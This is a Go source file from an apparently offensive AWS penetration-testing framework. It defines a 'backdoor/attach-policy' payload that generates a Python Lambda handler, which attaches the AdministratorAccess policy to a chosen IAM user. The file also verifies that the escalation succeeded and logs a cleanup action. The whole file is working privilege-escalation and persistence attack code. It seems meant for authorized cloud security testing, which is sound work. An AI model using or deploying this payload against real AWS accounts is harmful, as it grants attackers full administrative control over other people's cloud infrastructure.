package lambda

import (
	"context"
	"encoding/json"
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload attaches AdministratorAccess to a specified IAM user.
// This is ideal for event-triggered functions (e.g., lambda-002) where you can't
// capture the function's return value — the payload makes a direct IAM API call.
type BackdoorAttachPolicyPayload struct{}

func init() {
	payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess policy to an existing IAM user"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_USER",
			Description: "IAM user name or ARN to attach AdministratorAccess to",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "Policy ARN to attach (defaults to AdministratorAccess)",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_USER"] == "" {
		return fmt.Errorf("TARGET_USER is required for backdoor/attach-policy payload")
	}
	return nil
}

// GenerateCode produces a Python Lambda handler that attaches a policy to the target user.
// TARGET_USER and POLICY_ARN are passed via Lambda environment variables (not hardcoded)
// so the same function code works regardless of the specific user/policy.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	code := `import json
import boto3
import os

def lambda_handler(event, context):
    iam = boto3.client('iam')

    target_user = os.environ.get('TARGET_USER', '')
    # Accept both ARN (arn:aws:iam::ACCT:user/NAME) and plain username
    if target_user.startswith('arn:') and ':user/' in target_user:
        target_user = target_user.split(':user/')[-1]
    policy_arn = os.environ.get('POLICY_ARN', 'arn:aws:iam::aws:policy/AdministratorAccess')

    try:
        iam.attach_user_policy(
            UserName=target_user,
            PolicyArn=policy_arn
        )

        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': f'Successfully attached {policy_arn} to {target_user}',
                'target_user': target_user,
                'policy_arn': policy_arn,
                'status': 'success'
            })
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({
                'error': str(e),
                'message': 'Failed to attach policy',
                'status': 'error'
            })
        }
`

	return code, nil
}

// VerifySuccess checks whether the target user has gained the attached policy's permissions.
// It does this by attempting iam:ListUsers with the provided config (the starting user's creds).
// If the policy was attached, this call will succeed; otherwise it returns AccessDenied.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	iamClient := iam.NewFromConfig(config)

	_, err := iamClient.ListUsers(ctx, &iam.ListUsersInput{
		MaxItems: aws.Int32(1),
	})
	if err != nil {
		// AccessDenied means the policy hasn't taken effect yet
		return false, nil
	}

	// If we can list users, the admin policy was attached and propagated
	return true, nil
}

// ReportSideEffects returns the policy attachment as a tracked modification.
// The existing iam:attached-policy cleanup handler will detach it during workspace cleanup.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetUser := normalizeUserName(options["TARGET_USER"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", targetUser, "AdministratorAccess"),
			ARN:           policyArn,
			CleanupMethod: "iam:DetachUserPolicy",
			Metadata: map[string]string{
				"principal_type": "user",
				"principal_name": targetUser,
				"policy_arn":     policyArn,
			},
		},
	}
}

// normalizeUserName extracts the username from an IAM user ARN if provided.
// Accepts both "arn:aws:iam::123456789012:user/MyUser" and plain "MyUser".
func normalizeUserName(input string) string {
	if strings.HasPrefix(input, "arn:") {
		if idx := strings.Index(input, ":user/"); idx != -1 {
			return input[idx+len(":user/"):]
		}
	}
	return input
}

func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	var lambdaResponse map[string]interface{}
	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
		return result, err
	}

	body, ok := lambdaResponse["body"].(string)
	if !ok {
		return result, nil
	}

	var parsedBody map[string]interface{}
	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
		return result, err
	}

	var output strings.Builder
	output.WriteString("=== Attach Policy Results ===\n\n")

	if status, ok := parsedBody["status"].(string); ok {
		if status == "success" {
			output.WriteString("Policy attached successfully!\n\n")

			if targetUser, ok := parsedBody["target_user"].(string); ok {
				output.WriteString("Target User: " + targetUser + "\n")
			}

			if policyArn, ok := parsedBody["policy_arn"].(string); ok {
				output.WriteString("Policy ARN: " + policyArn + "\n")
			}

			output.WriteString("\nThe target user now has the attached policy permissions.\n")

		} else {
			output.WriteString("Failed to attach policy\n")
			if errMsg, ok := parsedBody["error"].(string); ok {
				output.WriteString("Error: " + errMsg + "\n")
			} else if message, ok := parsedBody["message"].(string); ok {
				output.WriteString("Error: " + message + "\n")
			}
		}
	}

	return output.String(), nil
}
